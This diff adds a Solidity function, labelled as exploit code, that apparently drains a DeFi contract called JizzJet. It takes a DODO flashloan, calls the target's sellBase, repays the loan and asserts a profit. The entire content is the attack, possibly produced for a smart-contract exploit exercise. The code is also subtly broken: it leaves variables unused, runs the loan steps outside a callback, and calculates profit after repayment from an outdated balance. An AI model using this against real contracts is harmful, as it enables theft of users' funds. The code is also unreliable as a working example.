@@ -1,0 +1,34 @@
+```xml
+<executeExploitCode>
+    function executeExploit(uint256 amount) internal {
+        // Step 1: Start by getting the WBNB balance
+        uint256 initialWbnbBalance = IERC20(uniswapRouter.WETH()).balanceOf(address(this));
+        console.log("Initial WBNB balance:", initialWbnbBalance);
+
+        // Step 2: Create an array of tokens contains just the valuableToken for flashloan
+        address[] memory tokens = new address[](1);
+        tokens[0] = address(valuableToken);
+
+        // Step 3: Quick flashloan with the valuableToken from DODO
+        IDODO(flashloanProvider).flashLoan(amount, 0, address(this), "0x0");
+
+        // Step 4: Approve the valuableToken to the JizzJet contract
+        valuableToken.approve(target, amount);
+
+        // Step 5: Call the sellBase from JizzJet contract to execute trading
+        IJizzJet(target).sellBase(address(this));
+
+        // Step 6: Calculate the new balance of valuableToken
+        uint256 finalValuableBalance = valuableToken.balanceOf(address(this));
+        console.log("Final valuableToken balance:", finalValuableBalance);
+
+        // Step 7: Transfer the initial loan amount back to the flashloan provider
+        valuableToken.transfer(flashloanProvider, amount);
+
+        // Step 8: Assert that we made a profit
+        uint256 profit = finalValuableBalance - amount;
+        require(profit > 0, "No profit made!");
+        console.log("Profit made:", profit);
+    }
+</executeExploitCode>
+```
